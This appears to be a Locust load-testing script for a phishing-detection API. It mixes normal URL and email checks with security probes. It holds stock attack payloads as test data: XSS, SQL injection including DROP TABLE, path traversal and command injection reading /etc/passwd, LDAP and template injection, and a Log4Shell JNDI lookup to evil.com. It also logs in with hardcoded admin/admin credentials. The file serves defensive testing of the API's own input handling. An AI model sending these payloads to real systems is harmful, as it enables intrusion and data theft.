#!/usr/bin/env python3
"""
Load Testing for Security
Comprehensive load testing to validate security under stress
"""

from locust import HttpUser, task, between
import random
import json
import time

class PhishingDetectionUser(HttpUser):
    """Locust user for load testing phishing detection API"""
    
    wait_time = between(1, 3)  # Wait 1-3 seconds between requests
    
    def on_start(self):
        """Initialize user session"""
        self.auth_token = None
        self.test_urls = [
            "https://www.google.com",
            "https://github.com",
            "http://192.168.1.1@bit.ly/phishing-bank",
            "https://suspicious-site.tk/urgent-verify",
            "https://phishing-paypal.tk/login",
            "https://secure-bank.ml/verify",
            "https://amazon-security.ga/update",
            "https://microsoft-verify.cf/account"
        ]
        
        # Authenticate user
        self.authenticate()
    
    def authenticate(self):
        """Authenticate user"""
        try:
            response = self.client.post("/security/authenticate", 
                json={"username": "admin", "password": "admin"})
            if response.status_code == 200:
                data = response.json()
                self.auth_token = data.get("access_token")
                print(f"✅ User authenticated: {self.auth_token[:10]}...")
        except Exception as e:
            print(f"❌ Authentication failed: {e}")
    
    @task(3)
    def test_url_prediction(self):
        """Test URL prediction endpoint"""
        url = random.choice(self.test_urls)
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        response = self.client.post("/predict/url",
            json={
                "url": url,
                "include_features": True,
                "include_security_analysis": True
            },
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            # Validate response structure
            assert "is_phishing" in data
            assert "confidence" in data
            assert "processing_time_ms" in data
        elif response.status_code == 429:
            print("⚠️ Rate limit hit - this is expected under load")
        else:
            print(f"❌ URL prediction failed: {response.status_code}")
    
    @task(2)
    def test_email_prediction(self):
        """Test email prediction endpoint"""
        email_samples = [
            {
                "email_content": "URGENT! Your PayPal account will be suspended! Click here: http://bit.ly/verify-paypal",
                "sender": "security@paypal-verify.tk",
                "subject": "URGENT: Account Suspension"
            },
            {
                "email_content": "Hello! We have exciting news about our new features. Check out our website for updates.",
                "sender": "newsletter@company.com",
                "subject": "Weekly Newsletter"
            },
            {
                "email_content": "Your bank account has been compromised. Verify your identity immediately: http://secure-bank.ml/verify",
                "sender": "alerts@bank-security.tk",
                "subject": "Security Alert"
            }
        ]
        
        email_data = random.choice(email_samples)
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        response = self.client.post("/predict/email",
            json=email_data,
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            assert "is_phishing" in data
            assert "confidence" in data
        elif response.status_code == 429:
            print("⚠️ Rate limit hit - this is expected under load")
        else:
            print(f"❌ Email prediction failed: {response.status_code}")
    
    @task(1)
    def test_health_check(self):
        """Test health check endpoint"""
        response = self.client.get("/health")
        
        if response.status_code == 200:
            data = response.json()
            assert "status" in data
            assert "timestamp" in data
        else:
            print(f"❌ Health check failed: {response.status_code}")
    
    @task(1)
    def test_security_analysis(self):
        """Test security analysis endpoint"""
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        response = self.client.get("/security/analysis", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            assert "security_summary" in data
            assert "ml_security" in data
        elif response.status_code == 401:
            print("⚠️ Authentication required for security analysis")
        else:
            print(f"❌ Security analysis failed: {response.status_code}")
    
    @task(1)
    def test_security_events(self):
        """Test security events endpoint"""
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        response = self.client.get("/security/events?limit=50", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            assert "events" in data
            assert "total_events" in data
        elif response.status_code == 401:
            print("⚠️ Authentication required for security events")
        else:
            print(f"❌ Security events failed: {response.status_code}")
    
    @task(1)
    def test_malicious_inputs(self):
        """Test API with malicious inputs to test security"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "javascript:alert('xss')",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "{{config.items()}}"
        ]
        
        malicious_input = random.choice(malicious_inputs)
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        # Test with malicious URL
        response = self.client.post("/predict/url",
            json={
                "url": f"https://example.com/{malicious_input}",
                "include_features": True
            },
            headers=headers
        )
        
        # Should either succeed (with sanitized input) or fail gracefully
        if response.status_code not in [200, 400, 422]:
            print(f"❌ Unexpected response to malicious input: {response.status_code}")
    
    @task(1)
    def test_rate_limiting(self):
        """Test rate limiting by making rapid requests"""
        # Make multiple rapid requests to test rate limiting
        for i in range(5):
            response = self.client.post("/predict/url",
                json={
                    "url": f"https://test-{i}.com",
                    "include_features": False
                }
            )
            
            if response.status_code == 429:
                print("✅ Rate limiting working correctly")
                break
            time.sleep(0.1)  # Small delay between requests
    
    @task(1)
    def test_authentication_bypass(self):
        """Test authentication bypass attempts"""
        # Try to access protected endpoints without authentication
        protected_endpoints = [
            "/security/analysis",
            "/security/events",
            "/model/info"
        ]
        
        endpoint = random.choice(protected_endpoints)
        response = self.client.get(endpoint)
        
        # Should return 401 or 403 for protected endpoints
        if response.status_code in [401, 403]:
            print("✅ Authentication protection working")
        elif response.status_code == 200:
            print("⚠️ Endpoint may not be properly protected")
    
    @task(1)
    def test_input_validation(self):
        """Test input validation with various malformed inputs"""
        malformed_inputs = [
            {"url": None},
            {"url": ""},
            {"url": "not-a-url"},
            {"url": "ftp://example.com"},
            {"url": "file:///etc/passwd"},
            {"email_content": None},
            {"email_content": ""},
            {"email_content": "x" * 10000}  # Very long input
        ]
        
        malformed_input = random.choice(malformed_inputs)
        
        if "url" in malformed_input:
            response = self.client.post("/predict/url", json=malformed_input)
        else:
            response = self.client.post("/predict/email", json=malformed_input)
        
        # Should return 400 or 422 for malformed inputs
        if response.status_code in [400, 422]:
            print("✅ Input validation working")
        elif response.status_code == 200:
            print("⚠️ Input validation may be too permissive")

class SecurityLoadTestUser(HttpUser):
    """Specialized user for security-focused load testing"""
    
    wait_time = between(0.1, 0.5)  # Faster requests for stress testing
    
    def on_start(self):
        """Initialize security test user"""
        self.attack_patterns = [
            "sql_injection",
            "xss_attack", 
            "path_traversal",
            "command_injection",
            "ldap_injection"
        ]
    
    @task(5)
    def test_security_under_load(self):
        """Test security mechanisms under load"""
        attack_type = random.choice(self.attack_patterns)
        
        if attack_type == "sql_injection":
            self.test_sql_injection()
        elif attack_type == "xss_attack":
            self.test_xss_attack()
        elif attack_type == "path_traversal":
            self.test_path_traversal()
        elif attack_type == "command_injection":
            self.test_command_injection()
        elif attack_type == "ldap_injection":
            self.test_ldap_injection()
    
    def test_sql_injection(self):
        """Test SQL injection protection"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT password FROM users --"
        ]
        
        payload = random.choice(sql_payloads)
        response = self.client.post("/predict/url",
            json={"url": f"https://example.com/search?q={payload}"})
        
        # Should be blocked or sanitized
        if response.status_code in [400, 422]:
            print("✅ SQL injection protection working")
    
    def test_xss_attack(self):
        """Test XSS protection"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>"
        ]
        
        payload = random.choice(xss_payloads)
        response = self.client.post("/predict/url",
            json={"url": f"https://example.com/page?content={payload}"})
        
        # Should be blocked or sanitized
        if response.status_code in [400, 422]:
            print("✅ XSS protection working")
    
    def test_path_traversal(self):
        """Test path traversal protection"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        payload = random.choice(path_payloads)
        response = self.client.post("/predict/url",
            json={"url": f"https://example.com/files/{payload}"})
        
        # Should be blocked or sanitized
        if response.status_code in [400, 422]:
            print("✅ Path traversal protection working")
    
    def test_command_injection(self):
        """Test command injection protection"""
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "& id",
            "` cat /etc/passwd `"
        ]
        
        payload = random.choice(cmd_payloads)
        response = self.client.post("/predict/url",
            json={"url": f"https://example.com/command?input={payload}"})
        
        # Should be blocked or sanitized
        if response.status_code in [400, 422]:
            print("✅ Command injection protection working")
    
    def test_ldap_injection(self):
        """Test LDAP injection protection"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(objectClass=*))",
            "*)(|(cn=*))"
        ]
        
        payload = random.choice(ldap_payloads)
        response = self.client.post("/predict/url",
            json={"url": f"https://example.com/ldap?filter={payload}"})
        
        # Should be blocked or sanitized
        if response.status_code in [400, 422]:
            print("✅ LDAP injection protection working")

# Custom Locust configuration
class SecurityTestConfig:
    """Configuration for security testing"""
    
    @staticmethod
    def get_test_scenarios():
        """Get test scenarios for different security tests"""
        return {
            "normal_load": {
                "user_classes": [PhishingDetectionUser],
                "spawn_rate": 10,
                "duration": "5m"
            },
            "security_stress": {
                "user_classes": [SecurityLoadTestUser],
                "spawn_rate": 5,
                "duration": "3m"
            },
            "mixed_load": {
                "user_classes": [PhishingDetectionUser, SecurityLoadTestUser],
                "spawn_rate": 15,
                "duration": "10m"
            }
        }

# Run load test
if __name__ == "__main__":
    print("🚀 Starting Security Load Testing...")
    print("📊 Test scenarios available:")
    for scenario, config in SecurityTestConfig.get_test_scenarios().items():
        print(f"   - {scenario}: {config['spawn_rate']} users, {config['duration']}")
    print("🔒 Security tests include:")
    print("   - Rate limiting validation")
    print("   - Input validation testing")
    print("   - Authentication bypass attempts")
    print("   - Malicious input handling")
    print("   - SQL injection protection")
    print("   - XSS attack protection")
    print("   - Path traversal protection")
    print("   - Command injection protection")
